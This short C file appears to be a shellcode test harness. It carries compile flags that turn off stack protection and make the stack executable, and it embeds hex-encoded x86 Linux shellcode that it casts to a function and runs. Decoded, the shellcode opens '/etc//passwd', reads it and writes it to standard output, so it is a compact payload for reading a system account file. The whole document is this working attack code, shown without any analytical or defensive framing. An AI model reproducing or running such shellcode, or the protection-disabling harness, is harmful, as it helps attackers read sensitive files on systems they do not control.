// compile with
// gcc -fno-stack-protector -z execstack _shellskeleton.c shellskeleton

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x29\xc9\xf7\xe1\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x05\xcd\x80\x93\x91\xb0\x03\x29\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x29\xc0\xb3\x01\xb0\x04\xcd\x80";


main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}